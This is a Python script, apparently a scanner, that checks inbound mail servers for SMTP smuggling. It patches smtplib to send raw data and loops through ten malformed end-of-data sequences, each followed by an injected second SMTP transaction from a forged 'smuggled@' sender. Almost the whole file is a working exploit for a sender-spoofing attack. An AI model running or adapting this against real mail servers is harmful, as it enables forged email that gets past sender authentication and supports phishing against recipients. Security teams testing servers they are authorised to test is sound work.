from colorama import Style
from colorama import Fore
import dns.resolver
import email.utils
import argparse
import datetime
import smtplib
import socket

smtp_connection_timeout = 10
current_server_replies = []
eod_sequences = [
    "\n.\n",
    "\n.\r",
    "\r.\n",
    "\r.\r",
    "\n.\r\n",
    "\r\n.\n",
    "\r.\r\n",
    "\r\n.\r",
    "\r\n\x00.\r\n",
    "\r\n.\x00\r\n"
]

class out:
    def green(self, msg):
        print(Fore.GREEN + msg + Style.RESET_ALL)

    def blue(self, msg):
        print(Fore.BLUE + msg + Style.RESET_ALL)

    def cyan(self, msg):
        print(Fore.CYAN + msg + Style.RESET_ALL)

    def red(self, msg):
        print(Fore.RED + msg + Style.RESET_ALL)

    def yellow(self, msg):
        print(Fore.YELLOW + msg + Style.RESET_ALL)

    def magenta(self, msg):
        print(Fore.MAGENTA + msg + Style.RESET_ALL)

    def alert(self, msg):
        print(Fore.RED + "[!] " + msg + Style.RESET_ALL)

    def info(self, msg):
        print(Fore.BLUE + "[*] " + msg + Style.RESET_ALL)

    def success(self, msg):
        print(Fore.GREEN + "[+] " + msg + Style.RESET_ALL)
    
    def debug(self, msg):
        if debug:
            print(Fore.CYAN + "[DEBUG] " + msg + Style.RESET_ALL)

##### Adapted smtplib's getreply(): https://github.com/python/cpython/blob/main/Lib/smtplib.py#L82
def new_getreply(self):
    global current_server_replies
    resp = []
    if self.file is None:
        self.file = self.sock.makefile('rb')
    while 1:
        try:
            line = self.file.readline(smtplib._MAXLINE + 1)
        except OSError as e:
            self.close()
            raise smtplib.SMTPServerDisconnected("Connection unexpectedly closed: " + str(e))
        if not line:
            self.close()
            raise smtplib.SMTPServerDisconnected("Connection unexpectedly closed")
        if self.debuglevel > 0:
            self._print_debug('reply:', repr(line))
        if len(line) > smtplib._MAXLINE:
            self.close()
            raise smtplib.SMTPResponseException(500, "Line too long.")
        resp.append(line[4:].strip(b' \t\r\n'))
        code = line[:3]
        # Check that the error code is syntactically correct.
        # Don't attempt to read a continuation line if it is broken.
        try:
            errcode = int(code)
        except ValueError:
            errcode = -1
            break
        # Check if multiline response.
        if line[3:4] != b"-":
            break

    errmsg = b"\n".join(resp)
    if self.debuglevel > 0:
        current_server_replies.append({"code": errcode, "message": errmsg.decode()})
        self._print_debug('reply: retcode (%s); Msg: %a' % (errcode, errmsg))
    return errcode, errmsg

##### Adapted smtplib's way of handling data
def new_data(self, msg):
        self.putcmd("data")

        (code, repl) = self.getreply()
        if self.debuglevel > 0:
            self._print_debug('data:', (code, repl))
        if code != 354:
            raise SMTPDataError(code, repl)
        else:
            ##### Patching input encoding so we can send raw messages
            #if isinstance(msg, str):
            #    msg = smtplib._fix_eols(msg).encode('ascii')
            #q = smtplib._quote_periods(msg)
            #if q[-2:] != smtplib.bCRLF:
            #    q = q + smtplib.bCRLF
            #q = q + b"." + smtplib.bCRLF
            q = msg
            self.send(q)
            (code, msg) = self.getreply()
            if self.debuglevel > 0:
                self._print_debug('data:', (code, msg))
            return (code, msg)

##### Used for bypassing some functionalities in smtplib
def return_unchanged(data):
    return data

##### Checks the used test setup by sending a test e-mail
def check_setup(inbound_smtp_server, sender_domain, receiver_address, tls, port):
    global current_server_replies
    current_server_replies = []
    try:
        if tls:
            server = smtplib.SMTP_SSL(inbound_smtp_server, port, timeout=smtp_connection_timeout)
        else:
            server = smtplib.SMTP(inbound_smtp_server, port, timeout=smtp_connection_timeout)

        if debug:
            server.set_debuglevel(1)
        
        mail_date = email.utils.format_datetime(datetime.datetime.now())
        message_id = email.utils.make_msgid(domain=sender_domain)
        server.ehlo(sender_domain)
        sender_address = f"setup_check@{sender_domain}"
        check_message = """\
From: {sender_address}
To: {receiver_address}
Subject: SETUP CHECK
Date: {mail_date}
Message-ID: {message_id}

Your setup seems to be working! You can now proceed with smuggling tests!
.
"""
        check_message = _fix_eols(check_message)
        check_message = check_message.format(sender_address=sender_address, receiver_address=receiver_address, mail_date=mail_date, message_id=message_id)
        server.sendmail(sender_address, [receiver_address], check_message)
        out.success("Sent setup e-mail! Check your inbox!")
        while True:
            server.getreply()

    except socket.error:
        for reply in enumerate(current_server_replies):
            out.debug(str(reply))
        pass
        return True
    except Exception as e:
        out.debug(str(e))
        try:
            server.quit()
            return True
        except Exception as e:
            pass
            return True

##### Performs multiple SMTP smuggling checks with a range of non-RFC compliant end-of-data sequences
def check_smuggling(inbound_smtp_server, sender_domain, receiver_address, tls, port):

    for eod_sequence in eod_sequences:
        global current_server_replies
        current_server_replies = []
        eod_sequence_string = repr(eod_sequence)
        try:
            if tls:
                server = smtplib.SMTP_SSL(inbound_smtp_server, port, timeout=smtp_connection_timeout)
            else:
                server = smtplib.SMTP(inbound_smtp_server, port, timeout=smtp_connection_timeout)

            if debug:
                server.set_debuglevel(1)

            mail_date = email.utils.format_datetime(datetime.datetime.now())
            message_id = email.utils.make_msgid(domain=sender_domain)
            message_id2 = email.utils.make_msgid(domain=sender_domain)
            server.ehlo(sender_domain)
            sender_address = f"test@{sender_domain}"
            sender_address_smuggled = f"smuggled@{sender_domain}"
            check_message = """\
From: {sender_address}
To: {receiver_address}
Subject: CHECK EMAIL ({eod_sequence_string})
Date: {mail_date}
Message-ID: {message_id}

TESTING {eod_sequence_string} as "fake" end-of-data sequence!
{inject}
mail FROM:<{sender_address_smuggled}>
rcpt TO:<{receiver_address}>
data
From: {sender_address_smuggled}
To: {receiver_address}
Subject: SMUGGLED EMAIL ({eod_sequence_string})
Date: {mail_date}
Message-ID: {message_id2}

SMUGGLING WORKS with {eod_sequence_string} as "fake" end-of-data sequence!
.
"""
            check_message = _fix_eols(check_message)
            check_message = check_message.format(inject=eod_sequence, eod_sequence_string=eod_sequence_string, sender_address=sender_address, sender_address_smuggled=sender_address_smuggled, receiver_address=receiver_address, mail_date=mail_date, message_id=message_id, message_id2=message_id2)
            server.sendmail(sender_address, [receiver_address], check_message)
            out.success(f"Sent smuggling e-mail for end-of-data sequence {eod_sequence_string}! Check your inbox!")
            while True:
                server.getreply()

        except socket.error as e:
            out.debug(str(e))
            for reply in enumerate(current_server_replies):
                out.debug(str(reply))

            pass
            continue
        except Exception as e:
            out.debug(str(e))
            try:
                server.quit()
                continue
            except Exception as e:
                pass
                continue

def run_check(sender_domain, receiver_address, inbound_smtp_server, setup_check, tls, port):
    receiver_domain = receiver_address.split("@")[1]

    if inbound_smtp_server == False:
        out.info(f"Getting MX record for domain: {receiver_domain}")
        try:
            inbound_smtp_server = str(dns.resolver.resolve(receiver_domain, 'MX')[0].exchange)
        except Exception as e:
            out.alert(f"Didn't find an MX record for domain {receiver_domain}! Is this a valid receiver domain?")
            return

    if setup_check:
        out.info("Running setup check!")
        check_setup(inbound_smtp_server, sender_domain, receiver_address, tls, port)
    else:
        out.info("Running SMTP smuggling check!")
        check_smuggling(inbound_smtp_server, sender_domain, receiver_address, tls, port)

if __name__ == '__main__':
    _fix_eols = smtplib._fix_eols
    smtplib._fix_eols = return_unchanged
    smtplib._quote_periods = return_unchanged
    smtplib.SMTP.data = new_data
    smtplib.SMTP.getreply = new_getreply
    out = out()
    
    argument_parser = argparse.ArgumentParser()
    argument_parser.add_argument("receiver_address", help="The receiver address to use. Make sure this is a valid e-mail address.", nargs=1)
    argument_parser.add_argument("--sender-domain", help="The sender domain to use. Make sure you have a valid SPF record for this domain.",default="check.smtpsmuggling.com")
    argument_parser.add_argument("--inbound-smtp-server", help="Manually specify the receiving/inbound SMTP server to check.", default=False)
    argument_parser.add_argument("--setup-check", help="Check if your setup is working by sending a test e-mail.", action="store_true")
    argument_parser.add_argument("--tls", help="Enforce the usage of TLS. (Don't forget changing the port!)", action="store_true")
    argument_parser.add_argument("--debug", help="Output debug info.", action="store_true")
    argument_parser.add_argument("-p", "--port", help="The port to use.", type=int, default=25)
    args = argument_parser.parse_args()
    debug = args.debug

    run_check(args.sender_domain, args.receiver_address[0], args.inbound_smtp_server, args.setup_check, args.tls, args.port)

    
